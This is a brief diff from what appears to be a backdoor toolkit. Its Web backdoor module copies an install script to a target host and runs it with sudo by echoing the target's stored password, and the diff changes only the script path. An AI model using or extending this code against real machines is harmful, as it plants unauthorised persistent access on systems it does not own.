@@ -19,7 +19,7 @@ class Web(Backdoor):
     def do_exploit(self, args):
         target = self.core.curtarget
         print("Creating web server....")
-        target.scpFiles(self, "auxiliary/web/install.sh", False)
+        target.scpFiles(self, "backdoors/auxiliary/web/install.sh", False)
         target.ssh.exec_command("echo " + target.pword + " | sudo -S bash ~/install.sh")
 	for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
